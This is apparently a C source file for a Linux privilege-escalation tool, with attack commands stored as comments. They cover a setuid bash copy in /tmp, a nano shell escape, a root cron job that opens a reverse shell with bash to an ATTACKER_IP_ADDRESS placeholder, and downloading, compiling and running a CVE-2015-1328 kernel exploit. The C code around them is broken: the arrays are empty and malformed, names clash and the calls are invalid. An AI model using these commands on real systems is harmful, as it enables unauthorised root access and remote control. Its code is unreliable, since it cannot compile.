/**
 * uid.c 
 * priv esc on vulnerable systems
*/

#include "uid.h"

/**
 * target must have:
 * 
 * gcc(for most attacks)
 * nano text editor(should be installed by default)
 * write access to /tmp directory
 * 
 * although there are multiple methods of attacking a target system, we can take advantage of a couple of them
*/

/**
 * we can take advantage of multiple methods, including lazy sudo configuration, suid, etc
 * 
 * however unlike normal scripts, this is instead a pre defined one
*/

// define scripts
uint8_t binaryEsc[100] {
    // cd /tmp
    // echo "/bin/bash" > exp
    // chmod x+s exp 
    // export PATH=$PATH:/tmp
    // ./exp
}

/**
 * for this exploit we leverage lazy privileges for nano, but again we can change this probably to another binary...
 * 
 * exploit source: https://gtfobins.github.io/gtfobins/nano
*/
uint8_t suidEsc[100] {
    // nano
    // ^R^X
    // reset; sh 1>&0 2>&0
}

uint8_t cronEsc[100] {
    // cd /home
    // echo "bash -i >& /dev/tcp/ATTACKER_IP_ADDRESS/PORT" > cron.sh
    // echo "* * * * * root /home/cron.sh"
}

uint8_t kernelExp[100] {
    // cd /tmp
    // wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2015/CVE-2015-1328/37292.c
    // gcc 37292.c -o kernelExp
    // chmod +s kernelExp
    // ./kernelExp
}

// attack creates a binary then runs it in the /tmp directory
void binaryEsc(void) {
    format(void);
    read(binaryEsc[100]);
}

// attack takes advantage of lazy sudo configuration for nano
void suidEsc(void) {
    format(void);
    read(suidEsc[100]);
}

// totally not xz!
// attack creates a root reverse shell using a cron job
void cronEsc(void) {
    format(void);
    read(cronEsc[100]);
}

// attack creates an overlay fs if vulnerable
void kernelExp(void) {
    format(void);
    read(kernelExp[100]);
}